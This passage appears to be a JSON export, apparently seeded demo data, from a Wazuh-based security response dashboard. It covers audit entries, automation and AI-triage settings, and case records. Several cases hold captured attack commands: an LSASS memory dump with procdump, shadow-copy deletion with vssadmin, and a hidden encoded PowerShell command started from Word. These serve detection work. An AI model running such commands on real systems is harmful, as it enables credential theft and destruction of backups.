#9","details":null,"ip":"127.0.0.1"},{"id":9,"ts":"2026-10-26T15:57:25.727897+00:00","username":"admin","role":"admin","action":"exception.create","target":"exception #2","details":{"note":"Inventory tool decodes its configuration","scope":"group","effect":"no_action","enabled":true,"rule_id":100146,"match_type":"process_path","match_value":"C:\\Program Files\\IT-Inventory\\*","scope_value":"client","expires_days":null},"ip":"127.0.0.1"},{"id":8,"ts":"2026-10-26T15:57:25.669181+00:00","username":"admin","role":"admin","action":"exception.create","target":"exception #1","details":{"note":"Backup agent updates its own exclusion","scope":"host","effect":"suppress","enabled":true,"rule_id":100211,"match_type":"command_contains","match_value":"BackupAgent","scope_value":"SRV-FILE-01","expires_days":180},"ip":"127.0.0.1"},{"id":7,"ts":"2026-10-26T15:57:25.608006+00:00","username":"it.helpdesk","role":null,"action":"password_reset.request","target":"it.helpdesk","details":null,"ip":"127.0.0.1"},{"id":6,"ts":"2026-10-26T15:57:25.562545+00:00","username":"admin","role":"admin","action":"user.create","target":"sec.omar","details":{"role":"analyst"},"ip":"127.0.0.1"},{"id":5,"ts":"2026-10-26T15:57:25.349507+00:00","username":"admin","role":"admin","action":"user.create","target":"it.helpdesk","details":{"role":"viewer"},"ip":"127.0.0.1"},{"id":4,"ts":"2026-10-26T15:57:25.136987+00:00","username":"admin","role":"admin","action":"user.create","target":"sec.anna","details":{"role":"analyst"},"ip":"127.0.0.1"},{"id":3,"ts":"2026-10-26T15:57:24.897990+00:00","username":"admin","role":"admin","action":"approval.reject","target":"approval #3","details":{"via":"dashboard","case":4,"host":"WS-HR-01","action":"kill","result":"rejected"},"ip":"127.0.0.1"},{"id":2,"ts":"2026-10-26T15:57:24.770550+00:00","username":"admin","role":"admin","action":"login","target":"admin","details":null,"ip":"127.0.0.1"},{"id":1,"ts":"2026-10-26T15:57:22.729646+00:00","username":"system","role":"system","action":"user.create","target":"admin","details":{"from":"env","role":"admin"},"ip":null}],"/api/settings":[{"key":"auto_action","value":true,"description":"Master switch for automatic actions (kill, popup, scan, evidence). Off: only approvals and manual actions","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"pause_auto_until","value":null,"description":"Automatic actions are paused until this time (empty = not paused)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"group_modes","value":{"*":"notify","dc":"notify","kiosk":"monitor","client":"contain","server":"notify"},"description":"contain = act on the host, notify = popup and kill only after approval, monitor = no action. A host in several listed groups gets the most restrictive mode. The server creates missing Wazuh groups within about a minute.","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"auto_kill_groups","value":["client"],"description":"contain groups where a high-risk, high-fidelity case is killed without approval (rate limits apply)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"kill_min_level","value":12,"description":"Minimum rule level for a high-risk case","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"kill_min_confidence","value":0.8,"description":"Minimum confidence of a TP verdict for a high-risk case","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"notice_min_level","value":10,"description":"Minimum rule level for a warning popup (medium risk)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"kill_rate_host_hour","value":3,"description":"Automatic kills allowed per host per hour; above it kills wait for approval","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"kill_rate_global_hour","value":20,"description":"Automatic kills allowed on all hosts per hour; above it kills wait for approval","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"approval_timeout_minutes","value":30,"description":"Minutes before an approval request expires (then nothing is done)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"suspend_on_request","value":false,"description":"contain groups: suspend the process while its kill waits for approval (resumed if rejected or expired)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"auto_scan","value":true,"description":"Run a Microsoft Defender quick scan after a kill","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"auto_evidence","value":true,"description":"Collect light evidence on the host for high-risk cases (contain and notify groups)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"isolation_enabled","value":true,"description":"Allow host isolation (always needs approval). Not verified on real Windows: test on one machine first","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"isolation_hours","value":4,"description":"Isolation is lifted automatically after this many hours","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"blockip_hours","value":24,"description":"A blocked IP is unblocked automatically after this many hours","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"process_allowlist","value":["lsass.exe","csrss.exe","wininit.exe","winlogon.exe","services.exe","smss.exe","svchost.exe","explorer.exe","msmpeng.exe","sysmon.exe","sysmon64.exe","wazuh-agent.exe"],"description":"Process names never killed automatically. Prefer path-based exceptions: a name can be copied by malware","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"outbreak_hosts","value":5,"description":"Hosts with the same signature that make an outbreak incident","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"outbreak_minutes","value":30,"description":"Time window for the outbreak check, in minutes","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"storm_cases","value":30,"description":"New cases that make an alert storm (AI and TI paused, one digest instead of single messages)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"storm_minutes","value":5,"description":"Time window for the storm check, in minutes","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"data_mode","value":"cloud","description":"local = no alert data leaves the server (no AI, no TI); cloud = AI and TI services listed below may be used","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"ai_enabled","value":true,"description":"In cloud mode: ask the AI about new cases without a verdict","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"ai_provider","value":"gemini","description":"AI provider: gemini, claude, or openai (any OpenAI-compatible API, including local models)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"ai_model","value":"gemini-3.8-flash","description":"Model name for the selected provider","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"ai_base_url","value":"","description":"OpenAI-compatible base URL (empty = https://api.openai.com/v1); a local model, for example http://10.0.0.20:11434/v1","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"mask_level","value":"full","description":"Masking before data reaches the AI: secrets, pseudonymize (plus users and hosts), full (plus internal IPs and profile paths)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"ti_providers","value":["virustotal","abuseipdb"],"description":"In cloud mode: threat-intelligence services to query (virustotal, abuseipdb)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"knowledge_ttl_ai_days","value":30,"description":"Days an AI verdict is reused before it expires","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"knowledge_ttl_analyst_days","value":90,"description":"Days an analyst verdict is reused before it expires","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"auto_close_analyst_fp","value":true,"description":"Close a case at once when it matches an analyst false-positive verdict","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"retention","value":{"enabled":true,"low_days":30,"case_days":60,"audit_days":60,"index_days":60,"action_days":60},"description":"Data lifetime in days. index = Wazuh alert indices; low = closed false-positive or low-risk cases; case = other closed cases; action = actions and approvals; audit = audit log","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"notify_min_risk","value":"medium","description":"Minimum risk for a case message: low, medium or high","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"notify_channels","value":{"slack":false,"teams":true,"discord":false,"telegram":true},"description":"Channels that receive notifications. Webhook addresses and the bot token are set with setup.sh n8n","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"telegram_chat_id","value":"-1001234567890","description":"Telegram chat that receives the notifications (empty = no Telegram)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"telegram_approvals","value":true,"description":"Show Approve / Reject buttons in Telegram (only users linked to a Telegram id can use them)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"dashboard_url","value":"https://10.0.0.5:8443","description":"Address of this dashboard, used for links in notifications","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"notice_text","value":"Security alert: suspicious activity was detected on this computer ({rule}, case #{case}). Save your work and call IT.","description":"Text of the popup shown to users, in their language; empty = built-in English text. {rule} = rule name, {case} = case number","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"templates","value":{"case":"[{verdict}] risk {risk} - case #{case}\nRule: {rule} (level {level}, {technique})\nHost: {host} (mode {mode})\nVerdict by {source}, confidence {confidence}\nUser: {user}   Process: {process}\nTI: {ti}\nActions: {actions}\nReasoning: {reasoning}\nAlerts in this case: {alerts}\n{link}","action":"Action {action} on {host} for case #{case}: {result}\n{detail}\n{link}","digest":"Alert storm: {count} new cases in the last {minutes} minutes. AI and threat intelligence are paused for new cases until it calms down.\nTop rules: {top}\n{link}","approval":"Approval needed: {action} on {host} (case #{case})\nRule: {rule}, risk {risk}, verdict {verdict}\nProcess: {process}\nExpires in {minutes} minutes.\n{link}","decision":"Approval #{approval} ({action} on {host}, case #{case}): {status} by {who}. {note}","incident":"OUTBREAK: {rule} on {hosts} hosts within {minutes} minutes (incident #{incident}).\nHosts: {host_list}\n{link}"},"description":"Message templates; placeholders in braces are filled in, unknown ones become empty","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"forward_soar_level","value":7,"description":"SOAR-SME rules from this level are sent to n8n (applied to Wazuh by the server)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"forward_builtin_level","value":12,"description":"Built-in Wazuh alerts from this level are also sent to n8n; 0 = never (applied by the server)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"liveness_interval","value":120,"description":"Seconds between liveness checks (applied by the server)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"liveness_groups","value":null,"description":"Groups checked for silent agents; empty = all SOAR groups (applied by the server)","updated_at":"2026-10-26T15:57:21.897116+00:00"},{"key":"group_profiles","value":{"kiosk":"lean"},"description":"Log collection per group: standard, or lean (PowerShell warnings only, fewer Sysmon events). Applied by the server","updated_at":"2026-10-26T15:57:21.897116+00:00"}],"case":{"43":{"id":43,"dedup_key":"o4","signature":"sig-outbreak","status":"open","rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_id":"007","agent_name":"KIOSK-01","source_ip":null,"process_image":"C:\\Windows\\System32\\wscript.exe","process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"risk":"medium","recommended_action":null,"reasoning":"Alert storm: AI analysis is paused for new cases. An analyst needs to review this case.","verdict_by":"policy","ti_summary":null,"analyst_verdict":null,"first_seen":"2026-10-26T15:48:23.252793+00:00","last_seen":"2026-10-26T15:48:23.252793+00:00","closed_at":null,"alert":null,"incident_id":1,"first_seen_env":false,"storm":false,"host_mode":"monitor","close_reason":null,"decision":{"actions":[],"skipped":[],"incident":1,"notified":true,"approvals":[]},"actions":[],"approvals":[],"knowledge":null},"42":{"id":42,"dedup_key":"o3","signature":"sig-outbreak","status":"open","rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_id":"004","agent_name":"WS-SALES-03","source_ip":null,"process_image":"C:\\Windows\\System32\\wscript.exe","process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"risk":"medium","recommended_action":null,"reasoning":"Alert storm: AI analysis is paused for new cases. An analyst needs to review this case.","verdict_by":"policy","ti_summary":null,"analyst_verdict":null,"first_seen":"2026-10-26T15:44:23.252793+00:00","last_seen":"2026-10-26T15:44:23.252793+00:00","closed_at":null,"alert":null,"incident_id":1,"first_seen_env":false,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"}],"skipped":[],"incident":1,"notified":true,"approvals":[]},"actions":[{"id":22,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:24.229741+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"41":{"id":41,"dedup_key":"o2","signature":"sig-outbreak","status":"open","rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_id":"003","agent_name":"WS-HR-01","source_ip":null,"process_image":"C:\\Windows\\System32\\wscript.exe","process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"risk":"medium","recommended_action":null,"reasoning":"Alert storm: AI analysis is paused for new cases. An analyst needs to review this case.","verdict_by":"policy","ti_summary":null,"analyst_verdict":null,"first_seen":"2026-10-26T15:40:23.252793+00:00","last_seen":"2026-10-26T15:40:23.252793+00:00","closed_at":null,"alert":null,"incident_id":1,"first_seen_env":false,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"}],"skipped":[],"incident":1,"notified":true,"approvals":[]},"actions":[{"id":21,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:24.157013+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"40":{"id":40,"dedup_key":"o1","signature":"sig-outbreak","status":"open","rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":"C:\\Windows\\System32\\wscript.exe","process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"risk":"medium","recommended_action":null,"reasoning":"Alert storm: AI analysis is paused for new cases. An analyst needs to review this case.","verdict_by":"policy","ti_summary":null,"analyst_verdict":null,"first_seen":"2026-10-26T15:36:23.252793+00:00","last_seen":"2026-10-26T15:36:23.252793+00:00","closed_at":null,"alert":null,"incident_id":1,"first_seen_env":false,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"}],"skipped":[],"incident":1,"notified":true,"approvals":[]},"actions":[{"id":20,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:24.092023+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"1":{"id":1,"dedup_key":"d0","signature":"sig0","status":"open","rule_id":100140,"rule_level":13,"rule_desc":"Suspicious handle opened to LSASS","technique":"T1003.001","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":"C:\\Users\\a.miller\\Downloads\\procdump64.exe","process_id":"6120","command_line":"procdump64.exe -accepteula -ma lsass.exe lsass.dmp","user_name":"CORP\\a.miller","iocs":{},"conclusive":false,"alert_count":1,"verdict":"TP","confidence":1.0,"risk":"high","recommended_action":null,"reasoning":"Rule is conclusive: a program from the Downloads folder opened LSASS with full access (credential dumping).","verdict_by":"rule","ti_summary":[{"summary":"41/72 engines: Trojan.Dumper","provider":"virustotal","indicator":"3f9a\u2026c21e","malicious":true}],"analyst_verdict":null,"first_seen":"2026-10-26T15:33:23.252793+00:00","last_seen":"2026-10-26T15:34:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":"CORP\\a.miller","image":"C:\\Users\\a.miller\\Downloads\\procdump64.exe","commandLine":"procdump64.exe -accepteula -ma lsass.exe lsass.dmp"}}},"rule":{"id":"100140","level":13,"mitre":{"id":["T1003.001"]},"description":"Suspicious handle opened to LSASS"},"agent":{"id":"001","name":"WS-FIN-01"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"},{"action":"evidence","detail":"sent to the agent","status":"sent"}],"skipped":[],"notified":true,"approvals":[{"id":1,"action":"kill","suspended":false}]},"actions":[{"id":1,"action":"notice","target":"popup","status":"done","detail":"Popup shown to the signed-in users","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.348691+00:00","finished_at":"2026-10-26T15:57:24.566896+00:00","expires_at":null},{"id":2,"action":"evidence","target":"light evidence","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.351159+00:00","finished_at":null,"expires_at":null}],"approvals":[{"id":1,"action":"kill","status":"pending","reason":"Kill proposed by the policy","requested_at":"2026-10-26T15:57:23.352645+00:00","expires_at":"2026-10-26T16:19:24.915409+00:00","decided_by":null,"decided_via":null,"note":null,"suspended":false}],"knowledge":null},"39":{"id":39,"dedup_key":"o0","signature":"sig-outbreak","status":"open","rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":"C:\\Windows\\System32\\wscript.exe","process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"risk":"medium","recommended_action":null,"reasoning":"Alert storm: AI analysis is paused for new cases. An analyst needs to review this case.","verdict_by":"policy","ti_summary":null,"analyst_verdict":null,"first_seen":"2026-10-26T15:32:23.252793+00:00","last_seen":"2026-10-26T15:32:23.252793+00:00","closed_at":null,"alert":null,"incident_id":1,"first_seen_env":false,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"}],"skipped":[],"incident":1,"notified":true,"approvals":[]},"actions":[{"id":19,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:24.033053+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"2":{"id":2,"dedup_key":"d1","signature":"sig1","status":"open","rule_id":100200,"rule_level":14,"rule_desc":"Shadow copies deleted or shrunk (ransomware precursor)","technique":"T1490","agent_id":"004","agent_name":"WS-SALES-03","source_ip":null,"process_image":"C:\\Users\\b.garcia\\AppData\\Local\\Temp\\invoice_viewer.exe","process_id":"4880","command_line":"vssadmin delete shadows /all /quiet","user_name":"CORP\\b.garcia","iocs":{},"conclusive":false,"alert_count":3,"verdict":"TP","confidence":1.0,"risk":"high","recommended_action":null,"reasoning":"Rule is conclusive: shadow copies deleted by a program running from a temporary folder.","verdict_by":"rule","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-26T14:27:23.252793+00:00","last_seen":"2026-10-26T14:30:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":"CORP\\b.garcia","image":"C:\\Users\\b.garcia\\AppData\\Local\\Temp\\invoice_viewer.exe","commandLine":"vssadmin delete shadows /all /quiet"}}},"rule":{"id":"100200","level":14,"mitre":{"id":["T1490"]},"description":"Shadow copies deleted or shrunk (ransomware precursor)"},"agent":{"id":"004","name":"WS-SALES-03"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"},{"action":"evidence","detail":"sent to the agent","status":"sent"},{"action":"kill","detail":"sent to the agent","status":"sent"},{"action":"scan","detail":"sent to the agent","status":"sent"}],"skipped":[],"notified":true,"approvals":[{"id":2,"action":"isolate","suspended":false}]},"actions":[{"id":3,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.438961+00:00","finished_at":null,"expires_at":null},{"id":4,"action":"evidence","target":"light evidence","status":"done","detail":"212 processes, 64 connections (3 external), 98 automatic services, 4 non-Microsoft tasks, 6 Run entries","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.441288+00:00","finished_at":"2026-10-26T15:57:24.457535+00:00","expires_at":null},{"id":5,"action":"kill","target":"invoice_viewer.exe (PID 4880)","status":"done","detail":"Stopped invoice_viewer.exe (PID 4880) and 1 child process(es)","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.444016+00:00","finished_at":"2026-10-26T15:57:24.355909+00:00","expires_at":null},{"id":6,"action":"scan","target":"Defender quick scan","status":"done","detail":"Quick scan started with Microsoft Defender","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.445698+00:00","finished_at":"2026-10-26T15:57:24.409978+00:00","expires_at":null}],"approvals":[{"id":2,"action":"isolate","status":"pending","reason":"Isolation proposed for a high-risk case","requested_at":"2026-10-26T15:57:23.446269+00:00","expires_at":"2026-10-26T16:19:24.915409+00:00","decided_by":null,"decided_via":null,"note":null,"suspended":false}],"knowledge":null},"3":{"id":3,"dedup_key":"d2","signature":"sig2","status":"open","rule_id":100176,"rule_level":13,"rule_desc":"Microsoft Defender detected malware","technique":"T1204","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":"C:\\Users\\c.chen\\Downloads\\setup_crack.exe","process_id":"3312","command_line":"setup_crack.exe /silent","user_name":"CORP\\c.chen","iocs":{},"conclusive":false,"alert_count":1,"verdict":"TP","confidence":1.0,"risk":"high","recommended_action":null,"reasoning":"Rule is conclusive: Microsoft Defender reported Trojan:Win32/Wacatac on a running program.","verdict_by":"rule","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-26T10:57:23.252793+00:00","last_seen":"2026-10-26T10:58:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":"CORP\\c.chen","image":"C:\\Users\\c.chen\\Downloads\\setup_crack.exe","commandLine":"setup_crack.exe /silent"}}},"rule":{"id":"100176","level":13,"mitre":{"id":["T1204"]},"description":"Microsoft Defender detected malware"},"agent":{"id":"002","name":"WS-FIN-02"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"},{"action":"evidence","detail":"sent to the agent","status":"sent"},{"action":"kill","detail":"sent to the agent","status":"sent"},{"action":"scan","detail":"sent to the agent","status":"sent"}],"skipped":[],"notified":true,"approvals":[]},"actions":[{"id":7,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.497738+00:00","finished_at":null,"expires_at":null},{"id":8,"action":"evidence","target":"light evidence","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.500658+00:00","finished_at":null,"expires_at":null},{"id":9,"action":"kill","target":"setup_crack.exe (PID 3312)","status":"done","detail":"Stopped setup_crack.exe (PID 3312)","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.508000+00:00","finished_at":"2026-10-26T15:57:24.511629+00:00","expires_at":null},{"id":10,"action":"scan","target":"Defender quick scan","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.512468+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"4":{"id":4,"dedup_key":"d3","signature":"sig3","status":"open","rule_id":100220,"rule_level":12,"rule_desc":"Office document or PDF reader started a shell or script host (malicious document)","technique":"T1204.002","agent_id":"003","agent_name":"WS-HR-01","source_ip":null,"process_image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","process_id":"7740","command_line":"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...","user_name":"CORP\\d.kumar","iocs":{},"conclusive":false,"alert_count":2,"verdict":"TP","confidence":0.86,"risk":"high","recommended_action":null,"reasoning":"WINWORD.EXE started a hidden PowerShell with an encoded command that downloads and runs a script; typical of a malicious macro.","verdict_by":"ai","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-26T07:57:23.252793+00:00","last_seen":"2026-10-26T07:59:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":"CORP\\d.kumar","image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","commandLine":"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi..."}}},"rule":{"id":"100220","level":12,"mitre":{"id":["T1204.002"]},"description":"Office document or PDF reader started a shell or script host (malicious document)"},"agent":{"id":"003","name":"WS-HR-01"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"},{"action":"evidence","detail":"sent to the agent","status":"sent"}],"skipped":[],"notified":true,"approvals":[{"id":3,"action":"kill","suspended":false}]},"actions":[{"id":11,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.570989+00:00","finished_at":null,"expires_at":null},{"id":12,"action":"evidence","target":"light evidence","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.573705+00:00","finished_at":null,"expires_at":null}],"approvals":[{"id":3,"action":"kill","status":"rejected","reason":"Kill proposed by the policy","requested_at":"2026-10-26T15:57:23.574730+00:00","expires_at":"2026-10-26T16:27:23.574730+00:00","decided_by":"admin","decided_via":"dashboard","note":"No action taken.","suspended":false}],"knowledge":{"verdict":"TP","confidence":0.86,"source":"ai","hits":0,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-11-24T15:57:23.295869+00:00","disabled":false}},"5":{"id":5,"dedup_key":"d4","signature":"sig4","status":"open","rule_id":100231,"rule_level":12,"rule_desc":"Brute force: 10+ failed logons from 203.0.113.45 within 2 minutes","technique":"T1110.001","agent_id":"005","agent_name":"SRV-FILE-01","source_ip":"203.0.113.45","process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":14,"verdict":"NEEDS_REVIEW","confidence":0.55,"risk":"medium","recommended_action":null,"reasoning":"Many failed SMB logons from one public address; no successful logon followed. Check the firewall exposure of this server.","verdict_by":"ai","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-25T19:57:23.252793+00:00","last_seen":"2026-10-25T20:11:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":null,"image":null,"commandLine":null}}},"rule":{"id":"100231","level":12,"mitre":{"id":["T1110.001"]},"description":"Brute force: 10+ failed logons from 203.0.113.45 within 2 minutes"},"agent":{"id":"005","name":"SRV-FILE-01"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"notify","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"}],"skipped":[],"notified":true,"approvals":[]},"actions":[{"id":13,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.633931+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"37":{"id":37,"dedup_key":"h1-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-25T15:57:23.252793+00:00","last_seen":"2026-10-25T15:57:23.252793+00:00","closed_at":"2026-10-25T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"38":{"id":38,"dedup_key":"h1-1","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-25T14:57:23.252793+00:00","last_seen":"2026-10-25T14:57:23.252793+00:00","closed_at":"2026-10-25T14:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"6":{"id":6,"dedup_key":"d5","signature":"sig5","status":"open","rule_id":100110,"rule_level":14,"rule_desc":"HONEYTOKEN: service ticket requested for decoy SPN account (Kerberoasting)","technique":"T1558.003","agent_id":"006","agent_name":"DC01","source_ip":"10.0.10.37","process_image":null,"process_id":null,"command_line":null,"user_name":"CORP\\svc_backup_old","iocs":{},"conclusive":false,"alert_count":1,"verdict":"TP","confidence":1.0,"risk":"high","recommended_action":null,"reasoning":"Rule is conclusive: nobody should ever request a ticket for the decoy account.","verdict_by":"rule","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-25T13:57:23.252793+00:00","last_seen":"2026-10-25T13:58:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":"CORP\\svc_backup_old","image":null,"commandLine":null}}},"rule":{"id":"100110","level":14,"mitre":{"id":["T1558.003"]},"description":"HONEYTOKEN: service ticket requested for decoy SPN account (Kerberoasting)"},"agent":{"id":"006","name":"DC01"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"notify","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"},{"action":"evidence","detail":"sent to the 